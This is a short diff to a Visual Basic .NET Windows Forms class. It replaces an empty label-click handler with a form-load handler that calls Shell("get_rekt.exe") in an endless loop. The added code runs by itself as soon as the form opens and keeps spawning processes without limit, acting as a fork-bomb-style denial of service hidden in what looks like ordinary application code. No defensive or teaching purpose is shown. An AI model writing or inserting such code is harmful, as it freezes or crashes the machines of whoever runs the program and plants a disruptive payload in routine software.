@@ -1,5 +1,7 @@
 ﻿Public Class Form1
-    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click
-
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Do
+            Shell("get_rekt.exe")
+        Loop
     End Sub
 End Class
